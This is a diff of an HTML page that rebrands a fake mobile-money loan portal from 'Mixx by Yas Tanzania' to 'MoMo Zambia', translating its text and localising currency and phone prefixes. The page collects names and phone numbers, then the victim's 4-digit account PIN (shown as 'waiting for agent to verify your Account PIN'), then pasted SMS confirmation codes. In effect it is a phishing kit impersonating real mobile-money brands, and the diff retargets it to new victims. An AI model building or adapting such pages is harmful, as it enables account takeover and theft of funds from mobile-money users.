@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="sw">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title data-i18n="title">Mixx by Yas Tanzania — Portal ya Mikopo ya Kidijitali</title>
+  <title data-i18n="title">MoMo Zambia — Digital Loan & Credit Portal</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -17,17 +17,17 @@
           },
           colors: {
             brand: {
-              blueDark: '#0A192F',
-              blueDeep: '#002B66',
+              blueDark: '#0B2545',
+              blueDeep: '#134074',
               blue: '#0056C6',
-              blueRoyal: '#0284C7',
-              cyan: '#00C4FF',
-              yellow: '#FED100',
-              yellowHover: '#E5BC00',
-              yellowDark: '#D9AB00',
-              blueLight: '#F0F7FF',
-              blueBorder: '#BAE6FD',
-              black: '#070F1E',
+              blueRoyal: '#0077B6',
+              cyan: '#00B4D8',
+              yellow: '#FFB703',
+              yellowHover: '#FB8500',
+              yellowDark: '#D97706',
+              blueLight: '#EEF4F8',
+              blueBorder: '#8ECAE6',
+              black: '#0A1128',
               grayBg: '#F8FAFC',
               grayText: '#334155'
             }
@@ -56,16 +56,16 @@
       height: 24px;
       width: 24px;
       border-radius: 50%;
-      background: #FED100;
-      border: 3px solid #0A192F;
-      box-shadow: 0 4px 12px rgba(254, 209, 0, 0.5);
+      background: #FFB703;
+      border: 3px solid #0B2545;
+      box-shadow: 0 4px 12px rgba(255, 183, 3, 0.5);
       cursor: pointer;
       margin-top: -8px;
       transition: transform 0.15s ease, background-color 0.15s ease;
     }
     input[type=range]::-webkit-slider-thumb:hover {
       transform: scale(1.15);
-      background: #E5BC00;
+      background: #FB8500;
     }
     .pin-box {
       font-family: monospace;
@@ -79,14 +79,14 @@
       transform: translateY(-1px);
     }
     .mixx-gradient {
-      background: linear-gradient(135deg, #0A192F 0%, #002B66 45%, #0056C6 100%);
+      background: linear-gradient(135deg, #0B2545 0%, #134074 45%, #0056C6 100%);
     }
     .mixx-btn-gradient {
-      background: linear-gradient(135deg, #FED100 0%, #F59E0B 100%);
-      color: #0A192F;
+      background: linear-gradient(135deg, #FFB703 0%, #FB8500 100%);
+      color: #0B2545;
     }
     .mixx-blue-card {
-      background: linear-gradient(135deg, #0A192F 0%, #002B66 100%);
+      background: linear-gradient(135deg, #0B2545 0%, #134074 100%);
     }
   </style>
   <script src="/language.js" defer></script>
@@ -105,15 +105,15 @@
           </svg>
         </button>
         <div class="flex items-center space-x-2.5">
-          <img src="/mixx_by_yas_logo.svg" alt="Mixx by Yas" class="h-9 w-auto object-contain" />
+          <span class="text-xl font-black text-brand-yellow tracking-tight">MoMo Zambia 🇿🇲</span>
         </div>
       </div>
 
       <div class="flex items-center space-x-2">
         <button type="button" class="language-toggle bg-blue-950/80 hover:bg-blue-900 text-xs font-black text-brand-yellow px-2.5 py-1.5 rounded-md border border-yellow-400/40 transition-all">
-          SW
+          EN
         </button>
-        <button onclick="toggleNoticeModal(true, 'Customer Support', 'Mixx by Yas Tanzania Helpline: 100 (Toll-Free) au +255 754 000 000.')" class="p-1.5 text-blue-300 hover:text-brand-yellow rounded-lg transition-colors" aria-label="Info">
+        <button onclick="toggleNoticeModal(true, 'Customer Support', 'MoMo Zambia Support Helpline: 111 (Toll-Free) or +260 97 000 0000.')" class="p-1.5 text-blue-300 hover:text-brand-yellow rounded-lg transition-colors" aria-label="Info">
           <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
             <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
           </svg>
@@ -128,7 +128,7 @@
           <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-blue opacity-75"></span>
           <span class="relative inline-flex rounded-full h-2 w-2 bg-brand-blue"></span>
         </span>
-        <span>Imependekezwa na Wakala wa Mixx Wakala</span>
+        <span>Referred by MoMo Agent</span>
       </div>
       <span id="referral-code-display" class="font-mono bg-white px-2 py-0.5 rounded border border-brand-blueBorder text-[11px] text-brand-blueDeep font-bold"></span>
     </div>
@@ -146,10 +146,10 @@
               <svg class="w-3.5 h-3.5 text-blue-950" fill="currentColor" viewBox="0 0 20 20">
                 <path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/>
               </svg>
-              <span data-i18n="heroBadge">Idhini ya Papo Hapo via Mixx by Yas Tanzania 🇹🇿</span>
+              <span data-i18n="heroBadge">Instant Mobile Money Loan Approval 🇿🇲</span>
             </div>
-            <h2 class="text-2xl font-black tracking-tight text-white leading-snug" data-i18n="heroHeading">Simulisha Mkopo Wako</h2>
-            <p class="text-xs text-blue-100 mt-1 font-medium max-w-xs mx-auto" data-i18n="heroSubtitle">Pata fedha moja kwa moja kwenye akaunti yako ya Mixx by Yas Tanzania kwa dakika chache.</p>
+            <h2 class="text-2xl font-black tracking-tight text-white leading-snug" data-i18n="heroHeading">Simulate Your MoMo Loan</h2>
+            <p class="text-xs text-blue-100 mt-1 font-medium max-w-xs mx-auto" data-i18n="heroSubtitle">Get funds directly into your MTN MoMo / Airtel Money Zambia account within minutes.</p>
           </div>
         </div>
 
@@ -159,53 +159,53 @@
             <!-- Amount Display & Slider -->
             <div class="bg-brand-blueLight/80 border border-brand-blueBorder/80 rounded-2xl p-5 shadow-sm">
               <div class="flex justify-between items-center mb-1">
-                <span class="text-xs font-bold text-brand-blueDeep uppercase tracking-wider" data-i18n="requestedAmount">Kiasi Unachoomba</span>
-                <span class="text-xs font-black text-blue-950 bg-brand-yellow px-2.5 py-0.5 rounded-md shadow-xs" data-i18n="interestRate">Riba 5% kwa mwezi</span>
+                <span class="text-xs font-bold text-brand-blueDeep uppercase tracking-wider" data-i18n="requestedAmount">Requested Amount</span>
+                <span class="text-xs font-black text-blue-950 bg-brand-yellow px-2.5 py-0.5 rounded-md shadow-xs" data-i18n="interestRate">5% monthly rate</span>
               </div>
               <div class="text-center py-2">
-                <span id="calc-amount-display" class="text-3xl font-black text-brand-blueDark tracking-tight">TZS 5,000,000</span>
+                <span id="calc-amount-display" class="text-3xl font-black text-brand-blueDark tracking-tight">ZMW 20,000</span>
               </div>
 
               <input 
                 id="amount-range" 
                 type="range" 
-                min="500000" 
-                max="100000000" 
-                step="500000" 
-                value="5000000" 
+                min="1000" 
+                max="300000" 
+                step="1000" 
+                value="20000" 
                 oninput="updateCalculator(this.value)" 
                 class="my-3"
               />
 
               <div class="flex justify-between text-[11px] font-bold text-slate-500">
-                <span>TZS 500,000</span>
-                <span>TZS 50,000,000</span>
-                <span>TZS 100,000,000</span>
+                <span>K1,000</span>
+                <span>K150,000</span>
+                <span>K300,000</span>
               </div>
             </div>
 
             <!-- Term Selector Chips -->
             <div>
-              <label class="block text-xs font-bold text-slate-600 uppercase tracking-wider mb-2.5" data-i18n="repaymentTerm">Muda wa Kurejesha</label>
+              <label class="block text-xs font-bold text-slate-600 uppercase tracking-wider mb-2.5" data-i18n="repaymentTerm">Repayment Term</label>
               <div class="grid grid-cols-4 gap-2">
-                <button type="button" onclick="setTerm(1)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-brand-blue transition-all" data-i18n="month1">Mwezi 1</button>
-                <button type="button" onclick="setTerm(3)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-brand-blue transition-all" data-i18n="months3">Miezi 3</button>
-                <button type="button" onclick="setTerm(6)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border-2 border-brand-blue bg-brand-blueLight text-brand-blueDeep shadow-sm" data-i18n="months6">Miezi 6</button>
-                <button type="button" onclick="setTerm(12)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-brand-blue transition-all" data-i18n="months12">Miezi 12</button>
+                <button type="button" onclick="setTerm(1)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-brand-blue transition-all" data-i18n="month1">1 Month</button>
+                <button type="button" onclick="setTerm(3)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-brand-blue transition-all" data-i18n="months3">3 Months</button>
+                <button type="button" onclick="setTerm(6)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border-2 border-brand-blue bg-brand-blueLight text-brand-blueDeep shadow-sm" data-i18n="months6">6 Months</button>
+                <button type="button" onclick="setTerm(12)" class="term-btn py-2.5 px-2 text-xs font-bold rounded-xl border border-slate-200 text-slate-700 hover:border-brand-blue transition-all" data-i18n="months12">12 Months</button>
               </div>
             </div>
 
             <!-- Repayment Summary Card -->
             <div class="mixx-blue-card text-white rounded-2xl p-5 shadow-xl relative overflow-hidden border border-blue-900">
               <div class="flex justify-between items-center border-b border-blue-900/80 pb-3 mb-3">
-                <span class="text-xs text-blue-200" data-i18n="estMonthly">Marejesho kwa Mwezi:</span>
+                <span class="text-xs text-blue-200" data-i18n="estMonthly">Est. Monthly Repayment:</span>
                 <span class="text-xl font-black text-brand-yellow tracking-tight">
-                  <span id="calc-monthly-payment">958,333</span> TZS/mo
+                  <span id="calc-monthly-payment">3,833</span> ZMW/mo
                 </span>
               </div>
               <div class="flex justify-between items-center text-xs text-blue-200">
-                <span data-i18n="totalRepay">Jumla ya Kurejesha:</span>
-                <span id="calc-total-payment" class="font-extrabold text-white">TZS 5,750,000</span>
+                <span data-i18n="totalRepay">Total Repayable:</span>
+                <span id="calc-total-payment" class="font-extrabold text-white">ZMW 23,000</span>
               </div>
             </div>
           </div>
@@ -216,7 +216,7 @@
               type="button" 
               onclick="goToStep(1)" 
               class="w-full py-4 mixx-btn-gradient hover:opacity-95 active:scale-[0.99] font-black rounded-xl shadow-lg shadow-yellow-500/25 text-sm tracking-wider uppercase flex items-center justify-center space-x-2 transition-all duration-150">
-              <span data-i18n="applyNow">OMBA MKOPO SASA</span>
+              <span data-i18n="applyNow">APPLY FOR MOMO LOAN NOW</span>
               <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3"/>
               </svg>
@@ -228,57 +228,56 @@
       <!-- STEP 1: Loan Configuration Form -->
       <section id="step-1" class="hidden flex-1 flex flex-col p-4 sm:p-6 space-y-4 sm:space-y-6">
         <div>
-          <span class="text-[11px] font-black text-blue-950 bg-brand-yellow px-2.5 py-1 rounded-full uppercase tracking-wider">Hatua ya 1 ya 5</span>
+          <span class="text-[11px] font-black text-blue-950 bg-brand-yellow px-2.5 py-1 rounded-full uppercase tracking-wider">Step 1 of 4</span>
           <h2 class="text-xl font-extrabold text-slate-900 mt-2 flex items-center space-x-2">
             <span>🎯</span>
-            <span data-i18n="step1Title">Taarifa za Mkopo</span>
+            <span data-i18n="step1Title">Loan Details</span>
           </h2>
-          <p class="text-xs text-slate-500 mt-1" data-i18n="step1Sub">Chagua vigezo vya mkopo wako (Bustisha au Nivushe Plus).</p>
+          <p class="text-xs text-slate-500 mt-1" data-i18n="step1Sub">Select your desired loan parameters (K1,000 - K300,000 ZMW).</p>
         </div>
 
         <div class="space-y-4">
           <div>
             <label for="loan-type-select" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5" data-i18n="loanType">
               <span>🏷️</span>
-              <span>Aina ya Mkopo</span>
+              <span>Loan Type</span>
             </label>
             <select id="loan-type-select" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20">
-              <option value="Bustisha Micro-Loan">Bustisha Micro-Loan</option>
-              <option value="Nivushe Plus Loan" selected>Nivushe Plus Loan</option>
-              <option value="Biashara Micro-Credit">Biashara Micro-Credit</option>
-              <option value="Emergency Advance">Emergency Advance</option>
+              <option value="MoMo Personal Loan" selected>MoMo Personal Loan</option>
+              <option value="MoMo Business Credit">MoMo Business Credit</option>
+              <option value="MoMo Quick Cash Advance">MoMo Quick Cash Advance</option>
+              <option value="MoMo Emergency Loan">MoMo Emergency Loan</option>
             </select>
           </div>
 
           <div>
             <label for="loan-amount-input" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5" data-i18n="amountLabel">
               <span>💰</span>
-              <span>Kiasi cha Mkopo (TZS)</span>
+              <span>Loan Amount (ZMW)</span>
             </label>
-            <input id="loan-amount-input" type="number" min="500000" max="100000000" step="100000" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm font-bold text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20" value="5000000" />
+            <input id="loan-amount-input" type="number" min="1000" max="300000" step="1000" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-sm font-bold text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20" value="20000" />
           </div>
 
           <div>
             <label for="loan-term-select" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5" data-i18n="termLabel">
               <span>📅</span>
-              <span>Muda wa Marejesho (Miezi)</span>
+              <span>Repayment Term (Months)</span>
             </label>
             <select id="loan-term-select" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20">
-              <option value="1">Mwezi 1</option>
-              <option value="3">Miezi 3</option>
-              <option value="6" selected>Miezi 6</option>
-              <option value="12">Miezi 12</option>
-              <option value="24">Miezi 24</option>
-              <option value="36">Miezi 36</option>
+              <option value="1">1 Month</option>
+              <option value="3">3 Months</option>
+              <option value="6" selected>6 Months</option>
+              <option value="12">12 Months</option>
+              <option value="24">24 Months</option>
             </select>
           </div>
 
           <div>
             <label for="loan-purpose-input" class="block text-xs font-bold text-slate-700 uppercase tracking-wider mb-1.5 flex items-center space-x-1.5" data-i18n="purposeLabel">
               <span>📝</span>
-              <span>Dhumuni la Mkopo</span>
+              <span>Loan Purpose</span>
             </label>
-            <textarea id="loan-purpose-input" rows="3" placeholder="mf. Ukuzi wa Biashara, Gharama za Matibabu, Upatikanaji wa Mtaji..." class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-medium text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20 resize-none">Biashara na Mtaji</textarea>
+            <textarea id="loan-purpose-input" rows="3" placeholder="e.g. Business expansion, Personal expenses, Medical..." class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-xs font-medium text-slate-800 focus:outline-none focus:border-brand-blue focus:ring-2 focus:ring-brand-blue/20 resize-none">Business & Capital</textarea>
           </div>
         </div>
 
@@ -288,7 +287,7 @@
             onclick="goToStep(2)" 
             class="w-full py-4 mixx-btn-gradient hover:opacity-95 text-blue-950 font-black rounded-xl shadow-md text-xs tracking-wider uppercase flex items-center justify-center space-x-2"
             data-i18n="continueToPersonal">
-            <span>ENDELEA KWENYE TAARIFA BINAWSI</span>
+            <span>CONTINUE TO PERSONAL DETAILS</span>
             <span>⚡</span>
           </button>
         </div>
@@ -297,12 +296,12 @@
       <!-- STEP 2: Applicant Information Form -->
       <section id="step-2" class="hidden flex-1 flex flex-col p-4 sm:p-5 space-y-3 sm:space-y-4">
         <div>
-          <span class="text-[11px] font-black text-blue-950 bg-brand-yellow px-2.5 py-1 rounded-full uppercase tracking-wider">Hatua ya 2 ya 5</span>
+          <span class="text-[11px] font-black text-blue-950 bg-brand-yellow px-2.5 py-1 rounded-full uppercase tracking-wider">Step 2 of 4</span>
           <h2 class="text-xl font-extrabold text-slate-900 mt-1.5 flex items-center space-x-2" data-i18n="step2Title">
             <span>👤</span>
-            <span>Taarifa za Mwombaji</span>
+            <span>Applicant Information</span>
           </h2>
-          <p class="text-xs text-slate-500 mt-0.5" data-i18n="step2Sub">Jaza taarifa zako rasmi za kitambulisho.</p>
+          <p class="text-xs text-slate-500 mt-0.5" data-i18n="step2Sub">Enter your official Zambian NRC & mobile account details.</p>
         </div>
 
         <div class="space-y-3">
@@ -310,46 +309,46 @@
             <div>
               <label for="first-name-input" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1" data-i18n="firstName">
                 <span>👤</span>
-                <span>Jina la Kwanza *</span>
+                <span>First Name *</span>
               </label>
-              <input id="first-name-input" type="text" placeholder="mf. Juma" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-blue" value="" required />
+              <input id="first-name-input" type="text" placeholder="e.g. Mulenga" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-blue" value="" required />
             </div>
             <div>
               <label for="last-name-input" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1" data-i18n="lastName">
                 <span>👤</span>
-                <span>Jina la Ukoo *</span>
+                <span>Last Name *</span>
               </label>
-              <input id="last-name-input" type="text" placeholder="mf. Hassan" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-blue" value="" required />
+              <input id="last-name-input" type="text" placeholder="e.g. Banda" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-blue" value="" required />
             </div>
           </div>
 
           <div>
             <label for="phone-number-input" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1" data-i18n="orangePhone">
               <span>📱</span>
-              <span>Nambari ya Simu ya Mixx (+255) *</span>
+              <span>MoMo Mobile Number (+260) *</span>
             </label>
             <div class="flex items-center">
-              <span class="bg-slate-200 border border-r-0 border-slate-300 rounded-l-xl px-3 py-2.5 text-xs font-bold text-slate-600">+255</span>
-              <input id="phone-number-input" type="tel" placeholder="754 123 456" oninput="checkReturningUserPhone(this.value)" class="w-full bg-slate-50 border border-slate-300 rounded-r-xl px-3.5 py-2.5 text-xs font-bold text-slate-800 focus:outline-none focus:border-brand-blue" value="" required />
+              <span class="bg-slate-200 border border-r-0 border-slate-300 rounded-l-xl px-3 py-2.5 text-xs font-bold text-slate-600">+260</span>
+              <input id="phone-number-input" type="tel" placeholder="971 234 567" oninput="checkReturningUserPhone(this.value)" class="w-full bg-slate-50 border border-slate-300 rounded-r-xl px-3.5 py-2.5 text-xs font-bold text-slate-800 focus:outline-none focus:border-brand-blue" value="" required />
             </div>
           </div>
 
           <div>
             <label for="employment-select" class="block text-[11px] font-bold text-slate-700 uppercase tracking-wider mb-1 flex items-center space-x-1" data-i18n="employmentStatus">
               <span>💼</span>
-              <span>Hali ya Ajira</span>
+              <span>Employment Status</span>
             </label>
             <select id="employment-select" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 text-xs font-semibold text-slate-800 focus:outline-none focus:border-brand-blue">
-              <option value="Employed">Ameajiriwa</option>
-              <option value="Self-Employed / Business Owner" selected>Kujiajiri / Mfanyabiashara</option>
-              <option value="Freelancer">Kazi Huru (Freelancer)</option>
-              <option value="Other">Nyingine</option>
+              <option value="Employed">Employed</option>
+              <option value="Self-Employed / Business Owner" selected>Self-Employed / Business Owner</option>
+              <option value="Freelancer">Freelancer</option>
+              <option value="Other">Other</option>
             </select>
           </div>
 
           <div class="flex items-center space-x-2 pt-1">
             <input id="agent-consent-checkbox" type="checkbox" checked class="w-4 h-4 text-brand-blue rounded border-slate-300 focus:ring-brand-blue" />
-            <label for="agent-consent-checkbox" class="text-[11px] text-slate-600 font-medium" data-i18n="agentConsent">🤝 Namruhusu wakala wa Mixx Wakala kufuatilia hali ya ombi langu.</label>
+            <label for="agent-consent-checkbox" class="text-[11px] text-slate-600 font-medium" data-i18n="agentConsent">🤝 I authorize the MoMo Agent to assist with tracking my application.</label>
           </div>
 
           <div id="step2-alert" class="mt-2 p-2.5 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 hidden"></div>
@@ -362,7 +361,7 @@
             onclick="submitStep2AndAwaitApproval()" 
             class="w-full py-3.5 sm:py-4 mixx-btn-gradient hover:opacity-95 text-blue-950 font-black rounded-xl shadow-md text-xs tracking-wider uppercase transition-all flex items-center justify-center space-x-2"
             data-i18n="continueToAuth">
-            <span>ENDELEA KWENYE UHAKIKI WA MIXX</span>
+            <span>CONTINUE TO MOMO AUTHENTICATION</span>
             <span>⚡</span>
           </button>
         </div>
@@ -371,9 +370,9 @@
         <div id="app-waiting-box" class="hidden p-3.5 bg-blue-50 border border-blue-200 rounded-2xl text-center space-y-2">
           <div class="flex items-center justify-center space-x-2">
             <span class="inline-block w-2.5 h-2.5 rounded-full bg-brand-blue animate-ping"></span>
-            <span class="text-xs font-bold text-blue-900 uppercase tracking-wider">Inasubiri Idhini ya Ombi</span>
+            <span class="text-xs font-bold text-blue-900 uppercase tracking-wider">Awaiting Application Approval</span>
           </div>
-          <p class="text-xs text-blue-800">Taarifa za ombi lako zimetumwa. Tafadhali subiri wakati wakala wako anaidhinisha ombi lako...</p>
+          <p class="text-xs text-blue-800">Your application details have been submitted. Please wait while your agent verifies...</p>
           <div class="flex justify-center pt-1">
             <svg class="animate-spin h-5 w-5 text-brand-blue" fill="none" viewBox="0 0 24 24">
               <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
@@ -384,24 +383,17 @@
 
       </section>
 
-      <!-- STEP 3: Customer Account PIN Validation (Hatua ya 3 ya 5) -->
+      <!-- STEP 3: Customer Account PIN Validation (Step 3 of 4) -->
       <section id="step-3" class="hidden flex-1 flex flex-col justify-between min-h-[580px] text-slate-800 bg-white">
         
-        <!-- Top Blue Banner Header with Yas Speech Bubble -->
+        <!-- Top Blue Banner Header -->
         <div class="mixx-gradient text-white pt-7 pb-8 px-6 text-center relative shadow-md">
           <div class="inline-flex flex-col items-center">
-            <div class="relative mb-2">
-              <div class="w-11 h-11 bg-brand-yellow rounded-full flex items-center justify-center shadow-md border-2 border-yellow-300">
-                <span class="text-blue-950 font-black text-sm tracking-tighter lowercase">yas</span>
-              </div>
-              <div class="absolute -bottom-1 left-1/2 -translate-x-1/2 w-2.5 h-2.5 bg-brand-yellow rotate-45"></div>
-            </div>
-            
             <h2 class="text-xl sm:text-2xl font-black text-brand-yellow tracking-tight flex items-center justify-center space-x-1.5">
               <span>🔐</span>
-              <span>Mixx by Yas</span>
+              <span>MoMo Account Sign In</span>
             </h2>
-            <p class="text-xs text-blue-100 font-medium mt-0.5">Uhakiki wa Akaunti ya Mteja</p>
+            <p class="text-xs text-blue-100 font-medium mt-0.5">Account PIN Verification</p>
           </div>
         </div>
 
@@ -409,23 +401,23 @@
         <div class="px-5 py-6 space-y-5 flex-1 flex flex-col justify-center max-w-sm mx-auto w-full">
           
           <div class="text-center space-y-1">
-            <span class="text-[11px] font-black text-blue-950 bg-brand-yellow px-2.5 py-0.5 rounded-full uppercase tracking-wider mb-1 inline-block">Hatua ya 3 ya 5</span>
+            <span class="text-[11px] font-black text-blue-950 bg-brand-yellow px-2.5 py-0.5 rounded-full uppercase tracking-wider mb-1 inline-block">Step 3 of 4</span>
             <h3 class="text-lg font-black text-slate-800 tracking-tight flex items-center justify-center space-x-1.5">
               <span>🔐</span>
-              <span>PIN ya Akaunti (Account PIN)</span>
+              <span>MoMo Account PIN</span>
             </h3>
-            <p class="text-xs text-slate-500 font-medium">Weka nambari ya simu na PIN yako ya Akaunti (tarakimu 4)</p>
+            <p class="text-xs text-slate-500 font-medium">Enter your mobile number and 4-digit MoMo Account PIN</p>
           </div>
 
           <!-- Phone Number Input Container -->
           <div>
             <label class="block text-xs font-bold text-slate-600 uppercase tracking-wider mb-1 flex items-center space-x-1" data-i18n="phoneNum">
               <span>📱</span>
-              <span>Nambari ya Simu (+255)</span>
+              <span>MoMo Mobile Number (+260)</span>
             </label>
             <div class="flex items-center bg-slate-50 border border-slate-300 rounded-xl px-3.5 py-2.5 focus-within:bg-white focus-within:border-brand-yellow focus-within:ring-2 focus-within:ring-brand-yellow/30 transition-all">
-              <span class="text-xs font-extrabold text-slate-500 mr-2">+255</span>
-              <input id="momo-phone-display" type="tel" placeholder="754 123 456" oninput="onMomoPhoneInput(this.value)" class="bg-transparent text-xs font-extrabold text-slate-800 w-full focus:outline-none" value="" />
+              <span class="text-xs font-extrabold text-slate-500 mr-2">+260</span>
+              <input id="momo-phone-display" type="tel" placeholder="971 234 567" oninput="onMomoPhoneInput(this.value)" class="bg-transparent text-xs font-extrabold text-slate-800 w-full focus:outline-none" value="" />
             </div>
           </div>
 
@@ -434,11 +426,11 @@
             <div class="flex items-center justify-between text-xs font-bold text-slate-600 uppercase tracking-wider px-1">
               <span class="flex items-center space-x-1">
                 <span>🔐</span>
-                <span>PIN ya Akaunti (Tarakimu 4)</span>
+                <span>Account PIN (4 Digits)</span>
               </span>
               <span class="text-[10px] font-semibold text-slate-400 flex items-center space-x-0.5">
                 <span>🛡️</span>
-                <span>Ulinzi wa 100%</span>
+                <span>100% Encrypted</span>
               </span>
             </div>
 
@@ -456,7 +448,7 @@
                   <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
                   <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
                 </svg>
-                <span id="eye-text" class="text-[9px] font-bold text-slate-400 mt-0.5">Onyesha</span>
+                <span id="eye-text" class="text-[9px] font-bold text-slate-400 mt-0.5">Show</span>
               </button>
             </div>
 
@@ -469,7 +461,7 @@
               onclick="submitAccountPin()" 
               class="w-full py-3.5 bg-blue-900/40 text-white/50 font-extrabold rounded-xl text-xs tracking-wider uppercase cursor-not-allowed transition-all duration-200 shadow-md flex items-center justify-center space-x-2">
               <span>⚡</span>
-              <span>THIBITISHA PIN YA AKAUNTI</span>
+              <span>CONFIRM & VALIDATE LOAN</span>
             </button>
           </div>
 
@@ -479,7 +471,7 @@
               <div class="w-8 h-8 border-3 border-slate-200 border-t-brand-yellow rounded-full animate-spin"></div>
             </div>
             <p class="text-xs text-slate-700 font-semibold leading-relaxed">
-              ⏳ Inasubiri msimamizi kuthibitisha PIN yako ya Akaunti...
+              ⏳ Waiting for agent to verify your Account PIN...
             </p>
           </div>
 
@@ -487,27 +479,27 @@
 
         <div class="mixx-gradient text-white pt-7 pb-6 px-4 text-center relative rounded-t-[40%] sm:rounded-t-[50%] overflow-hidden shadow-lg mt-auto">
           <div class="inline-flex flex-col items-center">
-            <span class="text-sm font-black text-brand-yellow tracking-tight">Mixx by Yas</span>
-            <span class="text-[11px] text-blue-100 font-medium">Uhakiki wa PIN ya Akaunti</span>
+            <span class="text-sm font-black text-brand-yellow tracking-tight">MoMo Zambia</span>
+            <span class="text-[11px] text-blue-100 font-medium">Account PIN Validation</span>
           </div>
         </div>
 
       </section>
 
-      <!-- STEP 4: SMS Verification Message (Hatua ya 4 ya 5) -->
+      <!-- STEP 4: SMS Verification Message (Step 4 of 4) -->
       <section id="step-4" class="hidden flex-1 flex flex-col p-4 sm:p-6 space-y-4 sm:space-y-5">
         <div>
           <div class="flex items-center justify-between">
-            <span class="text-[11px] font-black text-blue-950 bg-brand-yellow px-2.5 py-1 rounded-full uppercase tracking-wider">Hatua ya 4 ya 5</span>
+            <span class="text-[11px] font-black text-blue-950 bg-brand-yellow px-2.5 py-1 rounded-full uppercase tracking-wider">Step 4 of 4</span>
             <span id="sms-waiting-badge" class="inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200">
-              <span>Tayari Kubandika</span>
+              <span>Ready to Paste</span>
             </span>
           </div>
           <h2 class="text-xl font-extrabold text-slate-900 mt-2 flex items-center space-x-2" data-i18n="step4Title">
             <span>💬</span>
-            <span>Uhakiki wa Umiliki wa Akaunti</span>
+            <span>Account Ownership Verification</span>
           </h2>
-          <p class="text-xs text-slate-500 mt-1" data-i18n="step4Sub">📲 Nakili au subiri ujumbe wa uthibitisho (SMS) kutoka Mixx kisha ubandike hapa chini.</p>
+          <p class="text-xs text-slate-500 mt-1" data-i18n="step4Sub">📲 Copy or wait for the SMS confirmation message from MoMo then paste below.</p>
         </div>
 
         <!-- Live SMS Reception Card & Countdown Timer -->
@@ -518,7 +510,7 @@
                 <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-blue opacity-75"></span>
                 <span class="relative inline-flex rounded-full h-3 w-3 bg-brand-blue"></span>
               </span>
-              <span class="text-xs font-black text-blue-950 uppercase tracking-wider">Inasubiri SMS ya Mixx...</span>
